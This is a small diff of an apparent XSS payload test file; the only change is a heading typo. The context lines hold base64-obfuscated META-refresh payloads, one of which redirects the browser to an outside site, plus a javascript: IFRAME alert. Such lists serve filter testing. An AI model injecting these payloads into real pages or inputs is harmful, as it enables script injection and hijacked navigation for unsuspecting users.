@@ -2,7 +2,7 @@
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 http://ostermiller.org/calc/encode.html
 
-### Monstre Spaguettit Volant ###
+### Moinstre Spaguettit Volant ###
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html; base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24gPSAiaHR0cDovL3d3dy5zYWludGVnbGlzZWR1bW9uc3RyZWVuc3BhZ2hldHRpdm9sYW50LmJsb2dzcG90LmNhLyI8L3NjcmlwdD4=">
 
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
